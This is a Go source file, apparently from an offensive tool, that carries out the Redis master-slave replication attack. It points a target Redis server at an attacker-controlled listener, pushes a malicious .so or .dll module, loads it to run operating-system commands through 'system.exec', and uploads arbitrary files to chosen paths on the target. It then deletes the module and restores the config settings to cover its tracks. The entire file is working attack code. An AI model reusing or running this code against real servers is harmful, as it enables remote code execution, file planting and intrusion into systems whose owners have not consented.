package pkg

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

// RedisSlave 开启主从复制
func RedisSlave(lhost, lport, dir, dbfilename string) {
	RedisVersion(false)
	var payload []byte
	if strings.Contains(dbfilename, ".so") {
		payload = SoPayload
	} else {
		payload = DllPayload
	}

	RunRedisCmd("bgsave")
	slave := fmt.Sprintf("slaveof %v %v", lhost, lport)
	d := fmt.Sprintf("config set dir %v", dir)
	f := fmt.Sprintf("config set dbfilename %v", dbfilename)

	RunRedisCmd(slave)
	RunRedisCmd(d)
	RunRedisCmd(f)

	err := Listen(lhost, lport, payload)
	if err != nil {
		fmt.Println(err)
		return
	}

	load := fmt.Sprintf("module load %v/%v", dir, dbfilename)
	RunRedisCmd(load)

	defer RunRedisCmd(fmt.Sprintf("config set dir %v", Redis_dir))
	defer RunRedisCmd(fmt.Sprintf("config set dbfilename %v", Redis_dbfilename))

}

// RunCmd system.exec 执行命令
func RunCmd(cmd string) {
	ctx := context.Background()
	val, err := Rdb.Do(ctx, "system.exec", cmd).Result()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(GbkToUtf8(val.(string)))

}

// CloseSlave 关闭主从复制
func CloseSlave(dll string) {

	RunRedisCmd("slaveof no one")

	if strings.EqualFold(dll, "") {
		return
	}

	// 执行命令才卸载 module
	if strings.Contains(dll, ".so") {
		RunCmd("rm " + dll)
	}

	RunRedisCmd("module unload system")

}

// RedisUpload 主从复制上传文件
func RedisUpload(lhost, lport, rpath, rfile, lfile string) {
	RedisVersion(false)
	// 判断文件大小，发现个Redis  Bug 小于9个字节可能会把 Redis 给打崩
	fi, err := os.Stat(lfile)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}

	if fi.Size() < 9 {
		fmt.Println(fmt.Sprintf("当前文件大小：%d 个字节，不能上传小于 9 个字节, 因为可能会把Redis打崩哦", fi.Size()))
		os.Exit(0)
	}

	// 上传文件
	f, err := os.Open(lfile)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}

	payload, err := ioutil.ReadAll(f)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}

	slave := fmt.Sprintf("slaveof %v %v", lhost, lport)
	dir := fmt.Sprintf("config set dir %v", rpath)
	file := fmt.Sprintf("config set dbfilename %v", rfile)

	RunRedisCmd(slave)
	RunRedisCmd(dir)
	RunRedisCmd(file)

	Listen(lhost, lport, payload)

	fmt.Printf("[OK]\t%v uploaded successfully\n", rfile)

	defer CloseSlave("")

	defer RunRedisCmd(fmt.Sprintf("config set dir %v", Redis_dir))
	defer RunRedisCmd(fmt.Sprintf("config set dbfilename %v", Redis_dbfilename))

}
